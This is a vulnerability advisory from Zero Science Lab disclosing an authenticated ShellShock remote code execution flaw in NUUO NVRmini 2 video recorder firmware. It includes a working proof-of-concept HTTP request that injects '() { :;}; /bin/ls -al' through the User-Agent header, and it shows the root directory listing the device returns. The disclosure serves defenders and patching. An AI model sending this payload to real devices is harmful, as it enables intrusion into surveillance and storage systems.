@@ -1,0 +1,91 @@
+﻿NUUO NVRmini 2 NE-4160 ShellShock Remote Code Execution
+
+
+Vendor: NUUO Inc.
+Product web page: http://www.nuuo.com
+Affected version: Firmware Version: 02.02.00
+                  NVR Version: 02.02.0000.0040
+                  Device Pack Version: 04.07.0000.0030
+
+
+Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
+functionality. Setup is simple and easy, with automatic port forwarding
+settings built in. NVRmini 2 supports POS integration, making this the perfect
+solution for small retail chain stores. NVRmini 2 also comes full equipped as
+a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
+and RAID functions for data protection. Choose NVR and know that your valuable video
+data is safe, always.
+
+Desc: NUUO NVRmini, NVRmini2, Crystal, NVRSolo suffers from authenticated ShellShock
+vulnerability. This could allow an attacker to gain control over a targeted computer
+if exploited successfully. The vulnerability affects Bash, a common component known
+as a shell that appears in many versions of Linux and Unix.
+
+Tested on: GNU/Linux 2.6.31.8 (armv5tel)
+           lighttpd/1.4.28
+           PHP/5.5.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5352
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5352.php
+
+
+14.01.2016
+
+--
+
+
+POST /cgi-bin/cgi_system HTTP/1.1
+Host: 10.0.0.17
+Content-Length: 91
+Origin: http://10.0.0.17
+X-Requested-With: XMLHttpRequest
+User-Agent: () { :;}; /bin/ls -al
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+Referer: http://10.0.0.17/protocol_ftp.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: PHPSESSID=3bc601000ea8f085c22cb37b9b102b7f; lang=en
+Connection: close
+
+cmd=ftp_setup&act=modify&com_port=21&pasv_port_from=1024&pasv_port_to=65535&services=enable
+
+
+Response:
+
+HTTP/1.1 200 OK
+Connection: close
+Date: Fri, 15 Jan 2016 13:09:11 GMT
+Server: lighttpd/1.4.28
+Content-Length: 1652
+
+drwxr-xr-x    3 root     root           402 Oct 20  2014 .
+drwxr-xr-x    6 root     root          1024 Jan  4 22:49 ..
+-rwxr-xr-x    1 root     root        256564 Oct 20  2014 DaylightSavingWatcher
+-rwxr-xr-x    1 root     root         51376 Oct 20  2014 NuDatTool
+-rwxr-xr-x    1 root     root         60500 Oct 20  2014 NuDiscovery
+-rwxr-xr-x    1 root     root        930652 Oct 20  2014 NuHWMgn
+-rwxr-xr-x    1 root     root          8236 Oct 20  2014 NuNICWatcher
+-rwxr-xr-x    1 root     root           309 Oct 20  2014 after_mount.sh
+lrwxrwxrwx    1 root     root             7 Oct 20  2014 archive_mrg_mv -> lite_mv
+-rwxr-xr-x    1 root     root       1114844 Oct 20  2014 auto_upgrade
+lrwxrwxrwx    1 root     root             7 Oct 20  2014 cgi_main -> lite_mv
+-rwxr-xr-x    1 root     root        576992 Oct 20  2014 cgi_system
+lrwxrwxrwx    1 root     root             7 Oct 20  2014 ddns_update -> lite_mv
+-rwxr-xr-x    1 root     root           570 Oct 20  2014 getdhcpip.sh
+-rwxr-xr-x    1 root     root           388 Oct 20  2014 halt
+drwxr-xr-x    2 root     root            41 Oct 20  2014 lib
+-rwxr-xr-x    1 root     root       3827188 Oct 20  2014 lite_mv
+-rwxr-xr-x    1 root     root         15396 Oct 20  2014 nagent_mv
+-rwxr-xr-x    1 root     root          9836 Oct 20  2014 nu_btns
+-rwxr-xr-x    1 root     root          3496 Oct 20  2014 nudaemon
+-rwxr-xr-x    1 root     root         10616 Oct 20  2014 nufancontrol
+-rwxr-xr-x    1 root     root         12772 Oct 20  2014 nuklogd
+-rwxr-xr-x    1 root     root           392 Oct 20  2014 reboot
+-rwxr-xr-x    1 root     root         13144 Oct 20  2014 thwstat
+FTP Setup OK
